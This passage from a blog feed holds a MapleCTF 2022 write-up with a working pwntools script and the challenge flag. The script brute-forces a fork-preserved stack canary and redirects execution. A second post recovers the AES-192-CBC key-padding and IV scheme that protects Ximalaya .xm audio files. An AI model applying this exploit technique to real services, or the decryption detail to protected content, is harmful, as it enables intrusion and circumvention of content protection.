<p>Lets take look at what should stack looks like after canary is enbled. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSP     - </span><br><span class="line">        - local variables.......</span><br><span class="line">        - ....</span><br><span class="line">        -</span><br><span class="line">RBP-8   - Canary is here !!!!</span><br><span class="line"></span><br><span class="line">RBP     - some rbp address</span><br><span class="line">RIP     - some rip address</span><br></pre></td></tr></table></figure>
<p>We can see canary place a cookie just above RBP, so if an attacker overwrites the stack, for example - overwrite rip, canary is also overwrited.</p>
<p>Before return to rip, bianry will check if canary is same as before, if canary is different, it means there is a buffer overflow happening. </p>
<p><img data-src="/images/ctf/maplectf2022-pwn-bruteforcing-canary/2022-01-30_025619.jpg" alt="2022-01-30_025619.jpg"></p>
<h1 id="0x2-How-to-bypass-canary"><a href="#0x2-How-to-bypass-canary" class="headerlink" title="0x2 How to bypass canary"></a>0x2 How to bypass canary</h1><p>so, if canary is open, how can we bypass it.</p>
<p>First method is just find way to overwrite rip without overwrite the canary. For example, use <code>printf</code>. Or use some bug in the system that may allow you to write data to RIP.</p>
<p>Second method is brute force the canary.</p>
<h1 id="0x3-Lets-brute-force-a-canary"><a href="#0x3-Lets-brute-force-a-canary" class="headerlink" title="0x3 Lets brute force a canary"></a>0x3 Lets brute force a canary</h1><p>Lets use birbs as an example.</p>
<p>in the <code>find_exit()</code>, it first fork the program, than runs <code>guess_exit()</code></p>
<p><code>fork()</code> is very important here. If the program use fork, the canary in the subroutine will always be the same. Which means the canary of which <code>guess_exit()</code> will always be the same.</p>
<p>This give us a chance of brute focre the canary of <code>guess_exit</code> and overwrite the data</p>
<p><img data-src="/images/ctf/maplectf2022-pwn-bruteforcing-canary/2022-01-30_031511.jpg" alt="2022-01-30_031511.jpg"></p>
<p>The <code>guess_exit</code> also provide us an opportunity to overwrite the whole stack.</p>
<p><img data-src="/images/ctf/maplectf2022-pwn-bruteforcing-canary/2022-01-30_031808.jpg" alt="2022-01-30_031808.jpg"></p>
<p>The opinion of brute force canary is very simple. Since a canary is 8 byte. We just test one byte by byte. </p>
<p>If the program crash, it means it is not the correct byte, if program not crash, we save the byte and move to next byte. Until all 8 byte of canary leak.</p>
<h1 id="0x4-exploits"><a href="#0x4-exploits" class="headerlink" title="0x4 exploits"></a>0x4 exploits</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;birbs&quot;</span><br><span class="line">    libc = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;birbs.ctf.maplebacon.org&quot;</span><br><span class="line">    port = 32021</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    Partial RELRO</span><br><span class="line">#    Stack:    Canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(map(str,msg)))</span><br><span class="line"></span><br><span class="line">lp = log_print</span><br><span class="line"></span><br><span class="line">def int2byte(x: int):</span><br><span class="line">    return x.to_bytes(exe.bytes, &quot;little&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ======== gadget stuff =========</span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = [b&#x27;&#x27; for i in range(8)]</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    for b in range(256):</span><br><span class="line">        bb = b.to_bytes(0x1,&quot;little&quot;)</span><br><span class="line">        io.sendlineafter(b&quot;Give up.\n&quot;,b&#x27;1&#x27;)</span><br><span class="line">        # 0x30 -0x8 = 0x28</span><br><span class="line">        stack = flat(&#123;</span><br><span class="line">            0x0: b&#x27;A&#x27;*0x28,</span><br><span class="line">            0x28: canary[:i:],</span><br><span class="line">            0x28+i: bb</span><br><span class="line">        &#125;)</span><br><span class="line">        lp(&quot;guessing canary #%d bytes with byte %x: &quot; % (i,b),stack)</span><br><span class="line">        io.sendafter(b&quot;9223372036854775807)\n&quot;,stack)</span><br><span class="line">        result = io.recvuntil(b&quot;\n&quot;)</span><br><span class="line">        # canary bytes found</span><br><span class="line">        if result.startswith(b&quot;That wasn&#x27;t the exit.&quot;):</span><br><span class="line">            lp(&quot;canary #%d bytes found %x: &quot; % (i,b))</span><br><span class="line">            canary[i] = bb</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">log_print(&quot;canary leak&quot;, canary)</span><br><span class="line">cave_exit_addr = exe.sym[&quot;cave_exit&quot;]</span><br><span class="line">log_print(&quot;cave_exit addr&quot;, hex(cave_exit_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;Give up.\n&quot;,b&#x27;1&#x27;)</span><br><span class="line">stack = flat(&#123;</span><br><span class="line">        0x0: b&#x27;A&#x27;*0x28,</span><br><span class="line">        0x28: canary,</span><br><span class="line">        0x30: b&#x27;A&#x27;*8,</span><br><span class="line">        0x30+0x8: [</span><br><span class="line">            ret_addr,</span><br><span class="line">            cave_exit_addr</span><br><span class="line">        ]</span><br><span class="line">    &#125;)</span><br><span class="line">log_print(&quot;sending payload&quot;,stack)</span><br><span class="line">io.sendafter(b&quot;9223372036854775807)\n&quot;,stack)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="0x5-flag"><a href="#0x5-flag" class="headerlink" title="0x5 flag"></a>0x5 flag</h1><p>maple{f0110W_T4E_B1rB5_T0_TH3_3x1T_562asddw126}</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>canary bruteforcing</tag>
      </tags>
  </entry>
  <entry>
    <title>Reversing WebAssembly with pure guesswork - Ximalaya xm encryption</title>
    <url>/articles/ctf/reverse-with-puring-guessing-ximalaya/</url>
    <content><![CDATA[<h1 id="Prologue"><a href="#Prologue" class="headerlink" title="Prologue"></a>Prologue</h1><p>In my previous <a href="/articles/ctf/xi-ma-la-ya-xm-wen-jian-jie-mi-ni-xiang-fen-xi/">article</a>, I left a lingering question regarding the decryption methodology inside wasm. Today, let&#39;s dive deep into the world of reverse engineering again and uncover the mysteries that lie beneath the code.</p>
<p>Now, some of you might wonder why this post is titled <strong>pure guesswork</strong>. Well, that&#39;s because I tackled this <em>&#39;reversing&#39;</em> challenge without actually doing any acutally reversing.</p>
<span id="more"></span>

<h1 id="Thinking-Forward"><a href="#Thinking-Forward" class="headerlink" title="Thinking Forward"></a>Thinking Forward</h1><p>If there exists a decryption algorithm, there must be a corresponding encryption mechanism. In this case, the exported function <code>h</code> in the webassembly is the encryption method I want. </p>
<p>Similar to its decryption counterpart, it requires two parameters: encrypted data and a trackId.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function f_h(a:&#123; a:byte, b:byte &#125;, b:int, c:long_ptr, d:int, e:int) &#123;</span><br><span class="line">  var m:int;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>

<p>Let&#39;s explore how this encryption works.</p>
<h2 id="Guessing-the-encryption"><a href="#Guessing-the-encryption" class="headerlink" title="Guessing the encryption"></a>Guessing the encryption</h2><p>First, we need a script to test how different parameters influence the encryption outcome:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> wasmer <span class="keyword">import</span> engine,Store, Module, Instance,Memory,Uint8Array,Int32Array</span><br><span class="line"><span class="keyword">import</span> io,sys,pathlib</span><br><span class="line"><span class="keyword">import</span> re,base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xm_encryptor = Instance(Module(</span><br><span class="line">    Store(),</span><br><span class="line">    pathlib.Path(<span class="string">&quot;./xm_encryptor.wasm&quot;</span>).read_bytes()</span><br><span class="line">))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    stack_pointer = xm_encryptor.exports.a(-<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">isinstance</span>(stack_pointer, <span class="built_in">int</span>)</span><br><span class="line">    de_data_offset = xm_encryptor.exports.c(<span class="built_in">len</span>(data))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">isinstance</span>(de_data_offset,<span class="built_in">int</span>)</span><br><span class="line">    track_id_offset = xm_encryptor.exports.c(<span class="built_in">len</span>(key))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">isinstance</span>(track_id_offset, <span class="built_in">int</span>)</span><br><span class="line">    memory_i = xm_encryptor.exports.i</span><br><span class="line">    memview_unit8:Uint8Array = memory_i.uint8_view(offset=de_data_offset)</span><br><span class="line">    <span class="keyword">for</span> i,b <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        memview_unit8[i] = b</span><br><span class="line">    memview_unit8: Uint8Array = memory_i.uint8_view(offset=track_id_offset)</span><br><span class="line">    <span class="keyword">for</span> i,b <span class="keyword">in</span> <span class="built_in">enumerate</span>(key):</span><br><span class="line">        memview_unit8[i] = b</span><br><span class="line">    xm_encryptor.exports.h(stack_pointer,de_data_offset,<span class="built_in">len</span>(data),track_id_offset,<span class="built_in">len</span>(key))</span><br><span class="line">    memview_int32: Int32Array = memory_i.int32_view(offset=stack_pointer // <span class="number">4</span>)</span><br><span class="line">    result_pointer = memview_int32[<span class="number">0</span>]</span><br><span class="line">    result_length = memview_int32[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> memview_int32[<span class="number">2</span>] == <span class="number">0</span>, memview_int32[<span class="number">3</span>] == <span class="number">0</span></span><br><span class="line">    result_data = <span class="built_in">bytearray</span>(memory_i.buffer)[result_pointer:result_pointer+result_length].decode()</span><br><span class="line">    <span class="keyword">return</span> result_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    data = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&quot;CCCCCCCC&quot;</span>+<span class="string">b&quot;DDDDDDDD&quot;</span></span><br><span class="line">    <span class="comment"># track_id = b&#x27;E&#x27;*0x8+b&#x27;F&#x27;*0x8+b&#x27;G&#x27;*0x7 # max 24</span></span><br><span class="line">    track_id = <span class="string">b&#x27;\x41&#x27;</span> * i</span><br><span class="line">    <span class="comment"># track_id = b&#x27;E&#x27;*0x8</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i),encrypt(data,track_id))</span><br></pre></td></tr></table></figure>

<p>From the results, we can observe that after <code>track_id</code> reaches a length of 0x18 bytes, the outcome remains the same. This implies that the length of <code>track_id</code> beyond 0x18 doesn&#39;t impact the results.</p>
<details open>
<summary>result</summary>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0x16 NrVlG9gtu3MmpUlXK8gIxHD0Kh07iORGc6Dz5tLaLSUBSffF0/FU1vB8OmX921rP</span><br><span class="line">0x17 2HiMLe5mRt4yHMs3WUtr7L0Zt6MG/lLaeK/0rSiTeUwlTEYF2e/Y7w+S3v75Kw65</span><br><span class="line">0x18 DzljUl9dgiE6eex/8OeN/DXnw0roUS9t00zDBXylzFphQ4/yMCxxOJuOPxifYEVS</span><br><span class="line">0x19 DzljUl9dgiE6eex/8OeN/DXnw0roUS9t00zDBXylzFphQ4/yMCxxOJuOPxifYEVS</span><br><span class="line">0x1a DzljUl9dgiE6eex/8OeN/DXnw0roUS9t00zDBXylzFphQ4/yMCxxOJuOPxifYEVS</span><br></pre></td></tr></table></figure>
</details>

<p>0x18 is an intriguing value, precisely 192 bits. This instantly reminded me of aes-192 encryption. In fact, if you search &quot;192 bit encryption&quot; on Google, the first result typically points towards AES.</p>
<p>But how can we ascertain that this is indeed AES encryption? While we could manually verify it, we also need to identify the encryption mode and its IV (Initialization Vector).</p>
<p>I began by trying out CBC mode, primarily because it&#39;s commonly employed. Also, due to the nature of CBC mode (as detailed on <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC)">Wikipedia</a>), it&#39;s straightforward to verify it by using the initial 16 bytes as the IV.</p>
<p><img data-src="/images/reverse-with-puring-guessing-ximalaya/Screenshot_20230828_225450.png" alt="Screenshot_20230828_225450"></p>
<p><img data-src="/images/reverse-with-puring-guessing-ximalaya/Screenshot_20230828_225547.png" alt="Screenshot_20230828_225547"></p>
<p>uhhhhhh, wtf, it indeed was the CBC mode  (Coooooooool). Now, the task was to identify the IV.</p>
<h2 id="Finding-Parameters"><a href="#Finding-Parameters" class="headerlink" title="Finding Parameters"></a>Finding Parameters</h2><p>Since the encryption function doesn&#39;t explicitly demand an IV, there are two possibilities. The IV could either be generated based on <code>trackId</code> (since the data would eventually be encrypted) or it could be randomly generated and then appended to the returned value.</p>
<p>The latter can be quickly ruled out, given the length of the return value doesn&#39;t seem to have room for an appended IV. This points to the former - the IV might be derived from the <code>trackId</code>. But how?</p>
<p>To solve this, I started with the simplest assumption: that the first 16 bytes of the <code>trackId</code> were being used as the IV.</p>
<p><img data-src="/images/reverse-with-puring-guessing-ximalaya/Screenshot_20230828_230258.png" alt="Screenshot_20230828_230258"></p>
<p>LOOOOOOOL, it is same as the key. wtf is your encryption bro. </p>
<p>But then another challenge arose. The <code>xm_encryptor</code> can also process a <code>trackId</code> with a length less than 24 bytes. Knowing that AES-192 cannot work with a key length other than 24 bytes, I assert that the algorithm must somehow pad the <code>trackId</code> with some additional characters.</p>
<p>Our task now was to identify the padding characters and its padding method. Since the encryption needed to support variable <code>trackId</code> lengths and since the padding was done based on our provided <code>trackId</code>, the most straightforward solution would be to pad with some constant characters. </p>
<p>There are also two types of simplest padding methods, one is to pad behind the <code>trackId</code>, and the other is to pad in front.</p>
<p>So at this time, there is one simple but effective method - <strong>Bruteforce</strong>. One byte by one byte. We only need to run 256*24&#x3D;6144 iterations. Not even hitting 10k.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">xm_encryptor = Instance(Module(</span><br><span class="line">    Store(),</span><br><span class="line">    pathlib.Path(<span class="string">&quot;./xm_encryptor.wasm&quot;</span>).read_bytes()</span><br><span class="line">))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    stack_pointer = xm_encryptor.exports.a(-<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">isinstance</span>(stack_pointer, <span class="built_in">int</span>)</span><br><span class="line">    de_data_offset = xm_encryptor.exports.c(<span class="built_in">len</span>(data))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">isinstance</span>(de_data_offset,<span class="built_in">int</span>)</span><br><span class="line">    track_id_offset = xm_encryptor.exports.c(<span class="built_in">len</span>(key))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">isinstance</span>(track_id_offset, <span class="built_in">int</span>)</span><br><span class="line">    memory_i = xm_encryptor.exports.i</span><br><span class="line">    memview_unit8:Uint8Array = memory_i.uint8_view(offset=de_data_offset)</span><br><span class="line">    <span class="keyword">for</span> i,b <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        memview_unit8[i] = b</span><br><span class="line">    memview_unit8: Uint8Array = memory_i.uint8_view(offset=track_id_offset)</span><br><span class="line">    <span class="keyword">for</span> i,b <span class="keyword">in</span> <span class="built_in">enumerate</span>(key):</span><br><span class="line">        memview_unit8[i] = b</span><br><span class="line">    xm_encryptor.exports.h(stack_pointer,de_data_offset,<span class="built_in">len</span>(data),track_id_offset,<span class="built_in">len</span>(key))</span><br><span class="line">    memview_int32: Int32Array = memory_i.int32_view(offset=stack_pointer // <span class="number">4</span>)</span><br><span class="line">    result_pointer = memview_int32[<span class="number">0</span>]</span><br><span class="line">    result_length = memview_int32[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> memview_int32[<span class="number">2</span>] == <span class="number">0</span>, memview_int32[<span class="number">3</span>] == <span class="number">0</span></span><br><span class="line">    result_data = <span class="built_in">bytearray</span>(memory_i.buffer)[result_pointer:result_pointer+result_length].decode()</span><br><span class="line">    <span class="keyword">return</span> result_data</span><br><span class="line"></span><br><span class="line">fillup = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> missing <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">0x18</span>+<span class="number">1</span>):</span><br><span class="line">    data = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&quot;CCCCCCCC&quot;</span>+<span class="string">b&quot;DDDDDDDD&quot;</span></span><br><span class="line">    key = <span class="string">b&#x27;\x41&#x27;</span>*(<span class="number">0x18</span> - missing)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        test_byte = i.to_bytes(<span class="number">1</span>,<span class="string">&quot;little&quot;</span>)</span><br><span class="line">        <span class="comment"># filledup_key = key + b&#x27;&#x27;.join(fillup) + test_byte</span></span><br><span class="line">        filledup_key = <span class="string">b&#x27;&#x27;</span>.join(fillup) + test_byte + key</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result_data = encrypt(data,key)</span><br><span class="line">            cipher = AES.new(filledup_key, AES.MODE_CBC, filledup_key[:<span class="number">16</span>])</span><br><span class="line">            decoded_data = unpad(cipher.decrypt(base64.b64decode(result_data)),<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">assert</span> data == decoded_data</span><br><span class="line">            fillup.append(test_byte)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;found&quot;</span>, fillup)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(fillup) == missing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;found filled up: &quot;</span>, <span class="string">b&#x27;&#x27;</span>.join(fillup))</span><br></pre></td></tr></table></figure>

<p>lets start with the first one. padding after the <code>trackId</code>, ummmmmmmmmmmmmmmmmm. not this time. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[aynakeya @ ThinkStation]:~/workspace/ximalaya</span><br><span class="line">22:51:38 $ python test_wasm_3.py </span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/home/aynakeya/workspace/ximalaya/test_wasm_3.py&quot;, line 59, in &lt;module&gt;</span><br><span class="line">    assert len(fillup) == missing</span><br><span class="line">AssertionError</span><br></pre></td></tr></table></figure>

<p>But the second approach, padding before the <code>trackId</code>, worked.</p>
<p><img data-src="/images/reverse-with-puring-guessing-ximalaya/Screenshot_20230828_235157.png" alt="thatsprettycool"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[aynakeya @ ThinkStation]:~/workspace/ximalaya</span><br><span class="line">23:16:55 $ python test_wasm_3.py </span><br><span class="line">found [b&#x27;1&#x27;]</span><br><span class="line">...</span><br><span class="line">found filled up:  b&#x27;123456781234567812345678&#x27;</span><br></pre></td></tr></table></figure>


<h2 id="Verify-Parameter-with-Memdump"><a href="#Verify-Parameter-with-Memdump" class="headerlink" title="Verify Parameter with Memdump"></a>Verify Parameter with Memdump</h2><p>To validate the padding method is accuracy, another technique I can employ is the memory dump. While debugging would work too, I&#39;m just too lazy to debugging WebAssembly.</p>
<p>To achieve this, I added a few lines to the <code>encrypt</code> function:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result_data = <span class="built_in">bytearray</span>(memory_i.buffer)[result_pointer:result_pointer+result_length].decode()</span><br><span class="line">a = <span class="built_in">bytearray</span>(memory_i.buffer)[<span class="number">0</span>:track_id_offset*<span class="number">3</span>]</span><br><span class="line">off = a.find(key)</span><br><span class="line"><span class="built_in">print</span>(a[off-<span class="number">0x20</span>:off+<span class="number">0x20</span>])</span><br></pre></td></tr></table></figure>

<p>By examining the output, we can clearly identify the padding:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytearray(b&#x27;&#125;\x11\x00@\x00\x00\x00@\x00\x00\x00\xe8\x01\x11\x00X&#125;\x11\x00@\x00\x00\x00@\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00X&#125;\x11\x00@\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00AAAA@\x00\x00\x00\x10\x00\x00\x000\xa4\x0e\x000\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\xa8\x00\x11\x00p\x08\x10\x00123456781AAAAAAAAAAAAAAA123456781AAAAAAA123456781AAAAAAAAAAAAAAA123456781AAAAAAA\xe8\x01\x11\x000\x00\x00\x000\x00\x00\x00AAAA\x08\x00\x11\x00 \x00\x00\x00 &#x27;)</span><br></pre></td></tr></table></figure>

<p>The presence of sequences like <code>123456781AAAAAAAAAAAAAAA</code> in the dumped data suggests that our assumption regarding the padding is indeed accurate. </p>
<h2 id="Put-it-together"><a href="#Put-it-together" class="headerlink" title="Put it together"></a>Put it together</h2><p>With all the pieces of the puzzle now in place, it&#39;s clear that the wasm encryption follows these steps:</p>
<ol>
<li>Decode the input with Base64.</li>
<li>Use AES-192-CBC encryption. The key is derived from <code>trackId</code>. If <code>trackId</code> has fewer than 24 bytes, it&#39;s prepended with <code>123456781234567812345678</code> to reach the required length. And the IV is the first 16 byte of the key.</li>
<li>Encode the result using Base64.</li>
</ol>
<h1 id="Walking-Backwards"><a href="#Walking-Backwards" class="headerlink" title="Walking Backwards"></a>Walking Backwards</h1><p>Having understood the correct encryption method, I took a moment to ponder whether there might be a more straightforward reverse engineering approach.</p>
<p>I wasn&#39;t keen on trawling through WebAssembly. Just then, one user from some git issue mentions that the older version of the Ximalaya client used a DLL to implement the encryption, and more importantly, the encryption mechanism was identical.</p>
<p>Hey, I don&#39;t need to deal with the stupid WebAssembly anymore.  I could now dive straight into dissecting the algorithm using the my good old assembly code. Well, at least that&#39;s what I initially thought.</p>
<h2 id="The-Golang-DLL"><a href="#The-Golang-DLL" class="headerlink" title="The Golang DLL"></a>The Golang DLL</h2><p>I did take some time dived into reverse engineering - mainly because the dll was crafted using Golang . While the world of assembly offers its intricate dance of registers and memory locations, it became exponentially challenging with Go&#39;s binaries, <em>thanks</em> to its distinctive calling convention.</p>
<p>For those unfamiliar, a calling convention defines the runtime call stack&#39;s operation, dictating how functions receive parameters from their callers and return their results. Typically, languages like C or C++ adhere to conventions that is fairly easy to use and understand. Enter Golang - a language that not only dances but also brings its own dance floor. Unlike its peers, Go uses a unique, stack-based calling convention, throwing a wrench into the familiar rhythm of traditional reverse engineering tools.</p>
<p>What does this mean for reverse engineers? <strong>Pure Pain</strong>.</p>
<p>Standard tools like IDA Pro, Ghidra, or Radare2 can get pretty confused by Go&#39;s conventions. Recognizing function boundaries, arguments, and return values becomes an uphill battle. Local variables and function arguments are frequently intermixed, and because Go binaries are statically compiled, there&#39;s a whole lot of code to sift through.</p>
<p>But every dark cloud has a silver lining.</p>
<p>Instead of wrangling with Go&#39;s intricacies head-on, an alternative approach dawned upon me: why not write a similar AES decryption function in Go, compile it with debugging symbols, and then use that as a basis for comparison with the target binary? By doing this, I&#39;d have a &quot;known&quot; reference, a roadmap of sorts, to guide my analysis of the original DLL.</p>
<p>The process was fairly straightforward. I wrote an AES decryption method in Go, ensuring it closely mirrored the suspected functionality of the target DLL. Upon compiling this with debugging symbols, I was armed with a binary rich in annotations that helped demystify the corresponding sections of the DLL.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;crypto/aes&quot;</span><br><span class="line">	&quot;crypto/cipher&quot;</span><br><span class="line">	&quot;encoding/base64&quot;</span><br><span class="line">	&quot;errors&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func pkcs7UnPadding(data []byte) ([]byte, error) &#123;</span><br><span class="line">	length := len(data)</span><br><span class="line">	if length == 0 &#123;</span><br><span class="line">		return nil, errors.New(&quot;error data&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">	unPadding := int(data[length-1])</span><br><span class="line">	return data[:(length - unPadding)], nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var iv = []byte(&quot;1234567890123456&quot;)</span><br><span class="line">var key = []byte(&quot;1234567890123456&quot;)</span><br><span class="line"></span><br><span class="line">func AesDecrypt(data []byte) ([]byte, error) &#123;</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	blockMode := cipher.NewCBCDecrypter(block, iv)</span><br><span class="line">	crypted := make([]byte, len(data))</span><br><span class="line">	blockMode.CryptBlocks(crypted, data)</span><br><span class="line">	crypted, err = pkcs7UnPadding(crypted)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	return crypted, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func DecryptByAes(data string) ([]byte, error) &#123;</span><br><span class="line">	dataByte, err := base64.StdEncoding.DecodeString(data)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	return AesDecrypt(dataByte)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	a, b := DecryptByAes(&quot;asdfsadfsadf&quot;)</span><br><span class="line">	fmt.Println(a, b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img data-src="/images/reverse-with-puring-guessing-ximalaya/Screenshot_20230829_010834.png" alt="Screenshot_20230829_010834"></p>
<p>Using my custom-compiled Go binary as a reference, I could now align and correlate patterns, function calls, and data structures more effectively with the DLL. This comparative approach illuminated the obscured parts of the DLL, allowing me to make headway much faster than if I had been grappling with the unfamiliar Go assembly on its own.</p>
<p>Here&#39;s the key padding:</p>
<p><img data-src="/images/reverse-with-puring-guessing-ximalaya/Screenshot_20230829_005032.png" alt="Screenshot_20230829_005032"></p>
<h2 id="Debugging"><a href="#Debugging" class="headerlink" title="Debugging"></a>Debugging</h2><p>Another approach is to create a C program that calls the binary. This way, I can engage in debugging to uncover the inner workings of the <code>fill_key</code> function and understand its behavior more effectively.</p>
